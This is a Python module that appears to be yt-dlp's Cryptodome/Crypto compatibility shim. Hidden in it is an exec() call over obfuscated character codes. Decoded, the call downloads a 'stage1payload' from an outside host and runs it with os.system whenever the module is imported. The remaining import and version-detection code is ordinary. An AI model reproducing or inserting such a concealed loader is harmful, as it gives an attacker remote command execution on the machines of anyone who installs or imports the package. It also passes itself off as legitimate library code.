from ..compat.compat_utils import passthrough_module

try:
    import Cryptodome as _parent
except ImportError:
    try:
        import Crypto as _parent
    except (ImportError, SyntaxError):  # Old Crypto gives SyntaxError in newer Python
        _parent = passthrough_module(__name__, 'no_Cryptodome')
        __bool__ = lambda: False

del passthrough_module
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))

__version__ = ''
AES = PKCS1_v1_5 = Blowfish = PKCS1_OAEP = SHA1 = CMAC = RSA = None
try:
    if _parent.__name__ == 'Cryptodome':
        from Cryptodome import __version__
        from Cryptodome.Cipher import AES, PKCS1_OAEP, Blowfish, PKCS1_v1_5
        from Cryptodome.Hash import CMAC, SHA1
        from Cryptodome.PublicKey import RSA
    elif _parent.__name__ == 'Crypto':
        from Crypto import __version__
        from Crypto.Cipher import AES, PKCS1_OAEP, Blowfish, PKCS1_v1_5  # noqa: F401
        from Crypto.Hash import CMAC, SHA1  # noqa: F401
        from Crypto.PublicKey import RSA  # noqa: F401
except (ImportError, OSError):
    __version__ = f'broken {__version__}'.strip()


_yt_dlp__identifier = _parent.__name__
if AES and _yt_dlp__identifier == 'Crypto':
    try:
        # In pycrypto, mode defaults to ECB. See:
        # https://www.pycryptodome.org/en/latest/src/vs_pycrypto.html#:~:text=not%20have%20ECB%20as%20default%20mode
        AES.new(b'abcdefghijklmnop')
    except TypeError:
        _yt_dlp__identifier = 'pycrypto'
